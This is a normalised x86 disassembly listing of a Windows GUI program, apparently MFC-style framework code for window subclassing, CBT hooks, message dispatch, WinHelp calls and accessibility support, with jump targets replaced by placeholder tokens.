jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ esi ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
mov [ ebp + 0xc ] ecx
jne r-xdata
mov eax 0x80004002
jmp r-xdata
cmp edi 0x1
je r-xdata
push [ ebp + 0x10 ]
push eax
call sub_40cf01
test eax eax
pop ecx
pop ecx
je r-xdata
push [ esi + 0x4 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
add esi 0xc
cmp [ ebp + 0xc ] 0x0
jne r-xdata
test eax eax
jl r-xdata
sub_40d04e
mov ecx [ esp + 0x4 ]
dec [ ecx + 0x14 ]
push esi
mov esi [ ecx + 0x14 ]
jne r-xdata
mov eax esi
pop esi
retn 0x4
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x70 ]
sub_40d0dd
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
mov ecx edi
call sub_40ef1c
test eax 0x40000000
jne r-xdata
pop edi
leave
retn 0xc
push ebx
mov ecx edi
call sub_40cdd2
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
test esi esi
mov eax [ edi + 0x20 ]
mov [ ebp - 0x8 ] eax
jne r-xdata
push [ esi + 0x20 ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] esi
jmp r-xdata
mov ecx esi
call sub_40cdd2
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x20 ]
call [ SendMessageA@IAT ]
pop esi
sub_40d153
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40cdd2
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x20 ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_40bc44
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_40bc44
cmp esi eax
je r-xdata
mov ecx esi
call sub_40ef50
test eax eax
je r-xdata
push [ esi + 0x20 ]
call [ SetForegroundWindow@IAT ]
xor eax eax
inc eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_40d1c9
push 0x40
mov eax sub_420fe0
call sub_410250
mov edi [ ebp + 0x8 ]
mov esi r--data
push esi
push edi
call [ GetPropA@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
xor ebx ebx
inc ebx
sub eax 0x6
je r-xdata
push [ ebp + 0x14 ]
call sub_40bc44
push edi
mov esi eax
call sub_40bc44
push esi
push [ ebp + 0x10 ]
push eax
call sub_40d0dd
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4102bc
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_40bc44
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_40d153
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
push esi
push edi
call [ RemovePropA@IAT ]
push esi
call [ GlobalFindAtomA@IAT ]
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_40bc44
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_40ab5b
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_40c199
sub_40d2d8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x20 ]
call sub_4087ba
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
call sub_40540f
mov eax r-xdata
retn
sub_40d30d
push 0x148
mov eax sub_421003
call sub_410286
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push sub_405503
mov ecx rw-data
mov [ ebp - 0x120 ] esi
call sub_4076fc
xor ecx ecx
test eax eax
setne cl
mov [ ebp - 0x11c ] eax
test ecx ecx
jne r-xdata
cmp [ ebp + 0x8 ] 0x3
je r-xdata
call sub_4054e9
mov edi [ esi ]
mov esi [ eax + 0x14 ]
call sub_407eab
test esi esi
movzx eax [ eax + 0x14 ]
mov [ ebp - 0x124 ] eax
jne r-xdata
push esi
push ebx
push [ ebp + 0x8 ]
push [ eax + 0x28 ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test [ edi + 0x20 ] 0x40000000
jne r-xdata
call sub_4102d0
retn 0xc
test esi esi
je r-xdata
push 0xffffffe6
push ebx
call [ GetClassLongA@IAT ]
test eax 0x10000
jne r-xdata
push [ ebp - 0x120 ]
mov edi [ ebp - 0x11c ]
push ebx
push 0x3
push [ edi + 0x28 ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x124 ] 0x0
mov esi eax
je r-xdata
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push [ esi + 0x1c ]
lea ecx [ ebp - 0x18 ]
call sub_407ef7
and [ ebp - 0x4 ] 0x0
push ebx
mov ecx esi
call sub_40bc85
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
mov esi sub_40c302
push esi
push 0xfffffffc
push ebx
mov edi eax
call [ SetWindowLongA@IAT ]
cmp eax esi
je r-xdata
mov eax [ edi + 0x28 ]
cmp eax 0xffff
ja r-xdata
mov eax esi
push [ edi + 0x28 ]
call [ UnhookWindowsHookEx@IAT ]
and [ edi + 0x28 ] 0x0
push 0xffffffe0
push ebx
call [ GetClassLongA@IAT ]
movzx eax ax
cmp ax [ rw-data ]
jne r-xdata
push 0x30
pop esi
push esi
lea eax [ ebp - 0x154 ]
push 0x0
push eax
call sub_4109d0
lea eax [ ebp - 0x154 ]
mov [ ebp - 0x154 ] esi
push eax
mov esi r--data
push esi
push 0x0
call sub_40a942
add esp 0x18
test ax ax
mov [ rw-data ] ax
je r-xdata
mov eax [ ebp - 0x11c ]
and [ eax + 0x14 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ edi ] eax
push r--data
push eax
call sub_40aab3
test eax eax
pop ecx
pop ecx
je r-xdata
push 0x5
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ edi + 0x28 ]
push eax
mov [ ebp - 0x18 ] 0x0
call [ GlobalGetAtomNameA@IAT ]
lea eax [ ebp - 0x18 ]
push 0xfffffffc
push ebx
call [ GetWindowLongA@IAT ]
test eax eax
mov [ ebp - 0x14 ] eax
je r-xdata
jmp r-xdata
push 0x100
lea eax [ ebp - 0x118 ]
push eax
push ebx
call [ GetClassNameA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x18 ]
push 0x0
call sub_4077c7
jmp r-xdata
mov edi [ GetPropA@IAT ]
mov esi r--data
push esi
push ebx
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x118 ]
push esi
push eax
mov [ ebp - 0x19 ] 0x0
call sub_412d06
test eax eax
pop ecx
pop ecx
je r-xdata
push [ ebp - 0x14 ]
push esi
push ebx
call [ SetPropA@IAT ]
push esi
push ebx
call edi
cmp eax [ ebp - 0x14 ]
jne r-xdata
push esi
call [ GlobalAddAtomA@IAT ]
push sub_40d1c9
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
sub_40d560
push esi
push sub_405503
mov ecx rw-data
call sub_4076fc
mov esi eax
test esi esi
jne r-xdata
push edi
mov edi [ esp + 0xc ]
cmp [ esi + 0x14 ] edi
je r-xdata
call sub_4054e9
pop edi
pop esi
retn 0x4
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_40d30d
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
mov [ esi + 0x28 ] eax
jne r-xdata
call sub_4054cf
sub_40d5b5
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
mov esi ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x28 ] eax
call sub_407eab
mov eax [ eax + 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x64 ]
test eax eax
jne r-xdata
push 0xffffffff
push edi
call sub_408ccb
test eax eax
jne r-xdata
push esi
call sub_40d560
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_40a9d6
add esp 0x30
mov edi eax
call sub_40bcec
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x114 ]
xor eax eax
jmp r-xdata
call sub_4054e9
xor eax eax
test edi edi
setne al
mov eax [ esi ]
mov ecx esi
call [ eax + 0x114 ]
pop edi
pop esi
leave
retn 0x2c
sub_40d692
push ebx
push esi
mov esi ecx
mov eax [ esi ]
push edi
call [ eax + 0x120 ]
test eax eax
je r-xdata
mov edi [ SendMessageA@IAT ]
xor ebx ebx
push ebx
push ebx
push 0x1f
push [ esi + 0x20 ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x20 ]
call sub_40c472
mov ecx esi
call sub_40cdd2
mov esi eax
cmp esi ebx
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x170 ]
push ebx
push ebx
push 0x1f
push [ esi + 0x20 ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x20 ]
call sub_40c472
call [ GetCapture@IAT ]
cmp eax ebx
je r-xdata
jmp sub_4054e9
pop edi
pop esi
pop ebx
retn
push ebx
push ebx
push 0x1f
push eax
call edi
sub_40d70e
push 0x70
mov eax sub_42104b
call sub_41021d
mov edi ecx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0x7fffffff
mov ebx [ ebp + 0x8 ]
cmp ebx 0x111
mov [ ebp - 0x4 ] eax
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0xe8 ]
test eax eax
je r-xdata
cmp ebx 0x6
mov esi [ ebp + 0x10 ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_40aafe
xor eax eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_40bc44
push eax
push [ ebp + 0xc ]
push edi
call sub_40d0dd
mov eax [ edi ]
lea edx [ ebp - 0x10 ]
push edx
push ecx
push [ ebp + 0xc ]
mov ecx edi
call [ eax + 0xec ]
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ edi + 0x4c ]
test eax eax
je r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_40d153
test eax eax
jne r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_40aafe
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ebx eax
xor ebx [ ebp + 0x8 ]
push 0x7
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0x10 ] eax
and ebx 0x1ff
call sub_40aacf
imul ebx ebx 0xc
mov eax [ ebp + 0x8 ]
add ebx rw-data
cmp eax [ ebx ]
mov [ ebp - 0x18 ] ebx
jne r-xdata
cmp [ eax + 0x74 ] 0x0
jle r-xdata
call sub_4102bc
retn 0x10
mov eax [ ebp - 0x18 ]
mov ebx [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax ebx
cmp ecx [ eax + 0x8 ]
jne r-xdata
cmp ebx 0x200
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ eax + 0x4 ]
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0x10 ] ebx
call sub_40aafe
test ebx ebx
je r-xdata
cmp ebx 0x100
jb r-xdata
cmp ebx 0x209
jbe r-xdata
cmp [ ebp + 0x8 ] 0xc000
push 0x0
push 0x0
jae r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_40aafe
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
lea eax [ ebx - 0x281 ]
cmp eax 0x10
ja r-xdata
cmp ebx 0x10f
jbe r-xdata
mov ecx [ edi + 0x4c ]
mov eax [ ecx ]
lea edx [ ebp - 0x10 ]
push edx
push esi
push [ ebp + 0xc ]
push ebx
call [ eax + 0x94 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x4 ]
push 0xc000
push eax
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebx + 0x4 ]
call sub_40a426
test eax eax
mov [ ebp + 0x10 ] eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ eax + 0x14 ]
mov eax [ eax + 0x10 ]
lea ecx [ eax - 0x1 ]
cmp ecx 0x44
ja r-xdata
jmp r-xdata
call sub_40a426
mov ebx eax
test ebx ebx
jne r-xdata
call [ ebx ]
mov ebx eax
mov [ ebp + 0x10 ] ebx
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] eax
lea ecx [ ebp - 0x14 ]
call sub_40aafe
jmp [ ecx * 4 + jump_table_40dc26 ]
mov ebx [ ebx + 0x14 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebp + 0x8 ]
cmp [ eax ] ecx
je r-xdata
mov ebx [ ebp + 0x10 ]
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push [ ebp + 0xc ]
call sub_409852
push eax
push [ ebp + 0xc ]
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push esi
call sub_40bc44
push eax
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_40bc44
push esi
push [ ebp + 0xc ]
call sub_40bc44
jmp r-xdata
push esi
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40947a
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] eax
call sub_40ab18
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x5c ] eax
call sub_40bc6b
test eax eax
jne r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40947a
mov eax [ esi + 0x4 ]
push [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call ebx
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_40bc44
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
call sub_40f2f6
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
push [ ebp + 0xc ]
call sub_40bc44
push eax
push esi
call sub_40bc44
push eax
xor eax eax
cmp [ edi + 0x20 ] esi
sete al
jmp r-xdata
push [ ebp + 0xc ]
call sub_409852
jmp r-xdata
push [ ebp + 0xc ]
call sub_40f2f6
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_40f2f6
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
push esi
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
call sub_40bc44
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_40bc44
jmp r-xdata
mov ecx [ ebp + 0xc ]
movsx edx cx
shr ecx 0x10
cmp eax 0x2a
movsx ecx cx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] ecx
jne r-xdata
push esi
push esi
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
mov ecx edi
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx edi
call ebx
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
push esi
push [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x14 ]
mov [ eax + 0x4 ] ebx
call sub_40aafe
push 0x0
push 0x0
push 0xc000
add ebx 0x18
push ebx
mov ecx edi
call ebx
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
call ebx
and [ ebp - 0x24 ] 0x0
and [ ebp - 0x5c ] 0x0
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_40c34d
jmp r-xdata
mov eax [ edi + 0x4c ]
test eax eax
je r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
push [ ebp + 0xc ]
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_40bc44
push eax
push [ ebp + 0xc ]
call sub_40bc44
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
movzx eax [ ebp + 0xc ]
push ecx
push edx
jmp r-xdata
push esi
call sub_40bc44
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
test eax eax
jne r-xdata
jmp r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x0
call sub_409891
jmp r-xdata
lea eax [ ebp - 0x7c ]
push [ ebp - 0x5c ]
lea ecx [ eax + 0x24 ]
call sub_4088a6
test eax eax
je r-xdata
mov [ ebp - 0x2c ] eax
sub_40dd3a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0xc
mov edx 0x111
cmp eax edx
push esi
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
lea edx [ eax - 0x132 ]
cmp edx 0x6
ja r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
push esi
shr eax 0x10
push esi
or eax 0xbd110000
push eax
push esi
call sub_40e84a
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
mov edx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
add eax 0xfffffece
push edi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
xor esi esi
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_40d70e
cmp [ edi ] esi
pop edi
jne r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40d70e
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
xor eax eax
inc eax
cmp ecx esi
je r-xdata
cmp eax 0x2f
jbe r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
xor esi esi
push esi
lea eax [ ebp - 0x8 ]
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_40e84a
jmp r-xdata
sub_40de1f
and [ rw-data ] 0x0
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
push 0x0
push 0x0
mov ecx esi
call sub_40ce8b
pop esi
retn 0x8
mov ecx [ esi + 0x4c ]
mov eax [ ecx ]
push 0xfffffd3f
call [ eax + 0x50 ]
sub_40de4b
push 0x14
mov eax sub_421070
call sub_410250
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
jne r-xdata
push 0x18
mov [ esi ] edi
mov [ ebp - 0x14 ] 0x8007000e
mov [ ebp - 0x4 ] edi
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp - 0x1c ] ecx
cmp ecx edi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax 0x80004003
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_40ced4
jmp r-xdata
call sub_4102bc
retn 0x4
cmp eax edi
je r-xdata
mov [ esi ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edi
sub_40debd
push ebp
sub esp 0x200
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x200 ] eax
push 0xc
mov eax sub_421093
call sub_410250
and [ ebp - 0x4 ] 0x0
call sub_407eab
mov ecx [ eax + 0x4 ]
call sub_40ea2b
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x200 ]
xor ecx ebp
call sub_40f589
add ebp 0x204
leave
retn
sub_40df15
call sub_4082df
push eax
lea ecx [ ebp - 0x14 ]
call sub_405b13
mov esi [ ebp - 0x18 ]
mov eax [ esi ]
xor edi edi
push edi
push 0x200
lea ecx [ ebp ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x443
push r--data
push r--data
lea eax [ ebp - 0x14 ]
push r--data
push eax
call sub_405f05
add esp 0x14
lea eax [ ebp ]
push eax
push 0x443
push r--data
push r--data
lea eax [ ebp - 0x14 ]
push r--data
push eax
call sub_405f05
add esp 0x18
jmp r-xdata
push edi
push edi
mov edi [ ebp - 0x14 ]
push edi
call sub_4071fc
lea ecx [ edi - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_4056ce
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
mov eax r-xdata
retn
sub_40dfad
push 0x0
mov eax sub_4210c3
call sub_41021d
mov edi ecx
call sub_407eab
mov esi [ eax + 0x4 ]
call sub_407eab
mov ecx [ eax + 0x4 ]
call sub_40ea16
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_40d692
mov ecx edi
call sub_40cdd2
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ esi + 0x64 ]
push [ eax + 0x20 ]
call [ WinHelpA@IAT ]
test eax eax
jne r-xdata
call sub_4054e9
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xb ]
call sub_40debd
call sub_4102bc
retn 0x8
push 0xffffffff
push eax
push 0xf107
call sub_40722d
sub_40e022
push 0x0
mov eax sub_4210c3
call sub_41021d
mov edi ecx
call sub_407eab
mov esi [ eax + 0x4 ]
call sub_407eab
mov ecx [ eax + 0x4 ]
call sub_40ea16
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_40d692
mov ecx edi
call sub_40cdd2
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ esi + 0x64 ]
push [ eax + 0x20 ]
call sub_40cbf5
test eax eax
jne r-xdata
call sub_4054e9
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xb ]
call sub_40debd
call sub_4102bc
retn 0x8
push 0xffffffff
push eax
push 0xf107
call sub_40722d
sub_40e096
push ebp
mov ebp esp
cmp [ ecx + 0x50 ] 0x0
je r-xdata
pop ebp
jmp sub_40dd3a
push esi
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
push [ ecx + 0x20 ]
call [ SendMessageA@IAT ]
add esi 0xfffffece
cmp esi 0x6
pop esi
ja r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ecx ] eax
pop ebp
retn 0x10
sub_40e0e1
push 0x4
mov eax sub_4210e6
call sub_41021d
mov esi ecx
cmp [ ebp + 0xc ] 0xfffffffc
mov edi 0x80004005
jne r-xdata
mov eax edi
call sub_4102bc
retn 0xc
mov eax [ esi ]
call [ eax + 0x88 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ esi + 0x2c ]
test eax eax
jne r-xdata
push eax
push [ ebp + 0x8 ]
push r--data
call LresultFromObject
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
xor edi edi
lea eax [ ebp - 0x10 ]
push eax
call sub_40de4b
mov edi eax
test edi edi
jl r-xdata
and [ ebp + 0xc ] 0x0
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp + 0xc ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
xor edi edi
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
lea edx [ esi + 0x34 ]
push edx
lea edx [ esi + 0x30 ]
push edx
mov [ esi + 0x2c ] eax
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
push [ esi + 0x2c ]
push [ ebp + 0x8 ]
push r--data
call LresultFromObject
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
sub_40e1a6
push 0x30
mov eax sub_421101
call sub_410250
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x38 ]
push eax
push [ esi + 0x24 ]
push [ esi + 0x10 ]
call sub_40a8ae
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
inc eax
push esi
call sub_40a81b
test ax ax
pop ecx
jne r-xdata
call sub_407eab
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_4086ff
and [ ebp - 0x4 ] 0x0
call sub_407eab
mov ecx [ esi + 0x24 ]
lea esi [ eax + 0x34 ]
push ecx
mov ecx esi
call sub_406ece
push 0xa
mov ecx esi
call sub_406e57
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_40876c
call sub_4102bc
retn 0x4
sub_40e234
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_407eab
movzx ecx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconA@IAT ]
push ecx
push eax
call edi
